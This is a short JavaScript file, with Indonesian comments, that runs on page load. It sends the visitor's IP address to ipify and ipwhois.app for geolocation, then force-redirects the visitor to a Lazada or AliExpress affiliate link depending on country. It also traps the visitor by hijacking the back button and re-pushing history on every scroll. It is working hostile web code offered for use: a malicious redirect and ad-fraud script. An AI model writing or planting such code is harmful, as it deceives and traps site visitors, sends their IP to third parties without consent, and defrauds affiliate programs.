const targetDirectDisableBack="";
const ipifyURL = "https://api.ipify.org/?format=json";
const indonesiaAdURL = "https://c.lazada.co.id/t/c.bdOcnQ?sub_aff_id=13maret";
const nonIndonesiaAdURL = "https://s.click.aliexpress.com/e/_DFG72Lt";

// Mengambil data IP dari api.ipify.org
fetch(ipifyURL)
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    // Mengecek apakah IP Indonesia atau bukan
    fetch(`https://ipwhois.app/json/${ip}`)
      .then(response => response.json())
      .then(data => {
        const country = data.country_code;
        // Mengecek apakah IP berasal dari Indonesia
        if (country === "ID") {
          window.location.href = indonesiaAdURL;
        } else {
          window.location.href = nonIndonesiaAdURL;
        }
      });
  });

// Menonaktifkan tombol back pada browser
history.pushState(null,document.title,window.location.href);
window.addEventListener('popstate',function(event){
  window.location.href=targetDirectDisableBack;
});

// Menonaktifkan fungsi scroll pada halaman
window.addEventListener('scroll',function(){
  history.pushState(null,document.title,window.location.href);
});
